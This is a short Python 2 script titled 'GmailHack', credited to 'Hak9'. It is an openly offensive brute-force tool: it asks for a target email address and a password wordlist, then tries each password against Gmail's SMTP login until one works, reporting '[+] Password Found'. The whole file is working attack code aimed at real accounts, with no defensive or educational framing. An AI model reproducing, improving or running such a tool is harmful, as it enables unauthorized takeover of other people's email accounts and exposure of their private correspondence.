#!/usr/bin/python
'''create by Hak9'''

import smtplib
from os import system

def main():
   print '==================================================='
   print '                 create by Hak9                    '
   print '==================================================='
   print '               ++++++++++++++++++++                '
   print '\n                                                 '
   print '                   GmailHack                       '
   print '                                 V.1.2             '
   print '                                                   '
   
main()
print '[01] Start Attack'
print '[02] Exit'
option = input('===>')
if option == 1:
   file_path = raw_input('Path of Password File :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_lst = pass_file.readlines()
def login():
    i = 0
    usr = raw_input('Target Email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for passw in pass_lst:
      i = i + 1
      print str(i) + '/' + str(len(pass_lst))
      try:
         server.login(usr, passw)
         system('clear')
         main()
         print '\n'
         print '[+] Password Found => ' + passw
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Password Found => ' + passw

            break
         else:
            print '[!] Password not Found => ' + passw
login()
